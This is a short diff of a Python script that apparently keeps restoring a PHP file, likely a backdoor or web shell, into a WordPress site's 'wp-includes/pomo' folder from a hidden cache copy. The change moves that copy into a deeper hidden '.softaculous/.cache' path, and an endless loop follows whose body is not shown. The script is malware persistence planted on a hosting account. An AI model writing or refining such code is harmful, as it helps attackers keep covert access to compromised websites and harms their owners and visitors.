@@ -2,7 +2,7 @@ import shutil
 import os
 import time
 
-backup_php = "/home2/foxlogde/.cache/logs.php"
+backup_php = "/home2/foxlogde/.softaculous/.cache/logs.php"
 restore_path = "/home2/foxlogde/public_html/wp-includes/pomo/react.php"
 
 while True:
